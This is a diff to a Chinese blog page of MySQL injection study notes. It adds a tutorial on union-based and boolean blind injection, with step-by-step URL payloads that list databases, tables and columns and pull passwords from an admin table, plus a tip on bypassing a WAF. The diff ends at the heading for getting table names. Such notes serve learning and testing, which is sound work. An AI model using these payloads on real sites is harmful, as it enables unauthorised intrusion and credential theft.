@@ -211,12 +211,10 @@ var _hmt = _hmt || [];
 <p>​	5.0.0版本以上</p>
 <blockquote>
 <ul>
-<li>存在information_schema数据库，里面包含了表和所有字段见图1-1-1</li>
+<li>存在information_schema数据库，里面包含了表和所有字段</li>
 <li>在版本5.4.0以下secure_file_priv默认为空，允许文件的打开写入，版本5.4.0以上secure_file_priv可以为空、null、/temp/（指定目录），当为null时不允许操作文件</li>
 </ul>
 </blockquote>
-<p>![1631761844093](E:\ZeroP\source_posts\WEB安全\注入攻击\SQL注入\01 MySQL注入.assets\1631761844093.png)</p>
-<center>[图1-1-1]</center>
 <h3 id="常用函数">常用函数</h3>
 <p>注！：</p>
 <blockquote>
@@ -292,6 +290,70 @@ var _hmt = _hmt || [];
 <p>user()==&gt;@@user</p>
 <p>updatexml()==&gt;extractivalue()</p>
 </blockquote>
+<p>再注入中<code>table_name</code>表示表名,<code>cloumn_name</code>表示列名</p>
+<h3 id="联合注入-union">联合注入(union)</h3>
+<p>1，使用and 1=1判断</p>
+<pre><code class="highlight sql">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> #有数据
+?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> #没有数据，存在注入漏洞</code></pre>
+<p>2，使用order  by判断有多少字段</p>
+<pre><code class="highlight sql">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">3</span> #报错说明字段数小于<span class="number">3</span>
+?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">2</span> #回显正常，说明字段数为<span class="number">2</span>
+?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">group</span> <span class="keyword">by</span> <span class="number">2</span> #回显正常，说明字段数为<span class="number">2</span>，如果<span class="keyword">order</span> <span class="keyword">by</span>被拦截可以试试<span class="keyword">group</span> <span class="keyword">by</span>原理是类似的</code></pre>
+<p>3，使用union联合查询</p>
+<pre><code class="highlight sq">?id=-1 union select null,null #查找显位，因为有两个字段，所以select也必须是两个字段</code></pre>
+<p>注：</p>
+<ul>
+<li>使用union时，为保证后面能够正常显示出来，需要保证前面查询不到值，所以<code>id=-1</code></li>
+<li>之所以使用null是因为不知道查询的字段的类型，所以用null，也有直接用1,2的，影响不大</li>
+</ul>
+<p>4，由上可以回显位置在index=1字段，所以开始查数据</p>
+<pre><code class="highlight sql">#数据库名查询
+?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> database(),<span class="keyword">null</span>
+
+#版本号查询
+?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> version(),<span class="keyword">null</span>
+
+#根据数据库查表名使用group_concat()
+?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> group_concat(table_name),<span class="keyword">null</span> <span class="keyword">from</span> inforamtion_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() #一般最好是用database()，如果直接用数据库名需要引号 `&quot;&quot;` 包起来
+
+#根据表名查字段名加入有admin表
+?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> group_concat(column_name),<span class="keyword">null</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span>&quot;admin&quot; #这样可以查询出所有字段名
+
+#查出对应数据，加入admin中有<span class="keyword">user</span>,password字段
+?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> password,<span class="keyword">null</span> <span class="keyword">from</span> admin limit <span class="number">0</span>,<span class="number">1</span> #查询显示返回结果中的第一条，使用limit限制
+?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> password,<span class="keyword">null</span> <span class="keyword">from</span> admin limit <span class="number">1</span>,<span class="number">1</span> #查询显示返回结果中的第二条，使用limit限制
+
+#<span class="keyword">user</span>字段的查询同理</code></pre>
+<blockquote>
+<p>以上情况都是没有waf的情况，如果遇到狗，需要自己去尝试使用base64或者其他方式绕过</p>
+<p>切记只是在联合查询的时候id=-1，在前面判断是否存在注入的时候id=1</p>
+</blockquote>
+<h3 id="Boolean注入">Boolean注入</h3>
+<p>布尔型盲注页面是不会返回信息的，所以需要我们自己判断，True or False is boolean</p>
+<p>1，在参数后面使用and 1=1判断</p>
+<pre><code class="highlight sql">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> #页面回显正常
+?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> #页面报错，注意是报错而不是没有数据，由此可段为布尔盲注</code></pre>
+<p>2，判断数据库长度length()</p>
+<pre><code class="highlight sql">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> length(database())<span class="operator">=</span><span class="number">8</span> #页面报错,数据库名长度并不等于<span class="number">8</span>
+?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> length(database())<span class="operator">=</span><span class="number">6</span> #页面报错，数据库名长度不等于<span class="number">6</span>
+?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> length(database())<span class="operator">=</span><span class="number">7</span> #页面正常显示，数据库名长度为<span class="number">7</span>
+
+?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> length(database())<span class="operator">&gt;=</span><span class="number">8</span> #页面报错,数据库名长度并不等于<span class="number">8</span>
+?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> length(database())<span class="operator">&lt;=</span><span class="number">6</span> #页面报错，数据库名长度不等于<span class="number">6</span>
+?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> length(database())<span class="operator">=</span><span class="number">7</span> #页面正常显示，数据库名长度为<span class="number">7</span>
+#以上足以说明布尔盲注需要的结果是准确值不像<span class="keyword">order</span> <span class="keyword">by</span>那样，只要在字段数范围内就正常显示</code></pre>
+<p>3，获取数据库名 需要用到ascii()或substr()函数</p>
+<pre><code class="highlight sql">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> substr(database(),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;a&#x27;</span> #页面正常显示，表示数据库第一个字符为 a
+?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> substr(database(),<span class="number">2</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;b&#x27;</span> #页面报错，表示数据库第二个字符不为 b
+?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> substr(database(),<span class="number">2</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;d&#x27;</span> #页面显示正常，表示数据库第二个字符为 d
+
+
+#使用ascii（）个人不推荐，还要多次转换
+?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">97</span> #页面正常显示，表示数据库第一个字符的ascii码为<span class="number">97</span>，然后查询ASCII码表可知<span class="number">97</span>为a
+## ASCII码表中可显示字符的范围是：<span class="number">0</span><span class="operator">~</span><span class="number">127</span>
+
+#依次执行可以查出数据库名，但是工程量有点大，可以自己写一个小公举使用python</code></pre>
+<p>4，获取表名</p>
 
 </div>
 
